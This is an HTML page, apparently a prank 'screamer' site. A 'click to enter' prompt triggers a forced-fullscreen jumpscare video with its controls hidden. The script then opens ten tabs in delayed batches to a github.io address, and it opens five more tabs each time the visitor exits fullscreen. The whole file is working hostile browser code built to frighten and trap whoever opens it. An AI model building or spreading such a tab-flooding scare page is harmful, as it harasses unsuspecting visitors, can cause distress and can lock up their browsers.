<!DOCTYPE html>
<html lang="en">
<head>
   <style>
    body, html {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: black;
      cursor: pointer; 
    }
    #scareVideo {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 999;
    }
    
    #scareVideo::-webkit-media-controls {
      display: none !important;
    }
    #scareVideo::-moz-media-controls {
        display: none !important;
    }
    video::-ms-media-controls {
        display: none !important;
    }
    video::-o-media-controls {
        display: none !important;
    }
    video {
        pointer-events: none;
    }

    #overlayText {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: "Comic Sans MS", cursive, sans-serif;
      color: white;
      font-size: 5em;
      text-align: center;
      z-index: 1000;
    }
  </style>
</head>
<body>

  <div id="overlayText">click to enter..</div>

  <video id="scareVideo" loop>
    <source src="jumpscare.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <script>
    const pageBody = document.body;
    const video = document.getElementById('scareVideo');
    const overlayText = document.getElementById('overlayText');
    let tabsOpened = false;

    pageBody.addEventListener('click', () => {
      // Hide text overlay
      overlayText.style.display = 'none';

      // Show video
      video.style.display = 'block';

      // Force fullscreen on the video
      if (video.requestFullscreen) {
        video.requestFullscreen();
      } else if (video.webkitRequestFullscreen) {
        video.webkitRequestFullscreen();
      } else if (video.msRequestFullscreen) {
        video.msRequestFullscreen();
      }

      video.play();

      // Open tabs ONLY if not already opened
      if (!tabsOpened) {
        tabsOpened = true;
        
        // Open multiple tabs to the target URL
        const url = 'https://loganexotic.github.io/zakusone/';
        
        // Open 5 tabs immediately
        for (let i = 0; i < 5; i++) {
          window.open(url, '_blank');
        }

        // Open 3 more tabs after a short delay to ensure they stack
        setTimeout(() => {
          for (let i = 0; i < 3; i++) {
            window.open(url, '_blank');
          }
        }, 300);

        // Open 2 more after another delay
        setTimeout(() => {
          for (let i = 0; i < 2; i++) {
            window.open(url, '_blank');
          }
        }, 600);
      }

    }, { once: true });

    // Detect when fullscreen is exited and open more tabs
    document.addEventListener('fullscreenchange', () => {
      if (!document.fullscreenElement && tabsOpened) {
        // User exited fullscreen - open a fresh batch of tabs
        const url = 'https://loganexotic.github.io/zakusone/';
        for (let i = 0; i < 5; i++) {
          window.open(url, '_blank');
        }
      }
    });

    // Also detect webkit fullscreen exit
    document.addEventListener('webkitfullscreenchange', () => {
      if (!document.webkitFullscreenElement && tabsOpened) {
        const url = 'https://loganexotic.github.io/zakusone/';
        for (let i = 0; i < 5; i++) {
          window.open(url, '_blank');
        }
      }
    });

  </script>

</body>
</html>
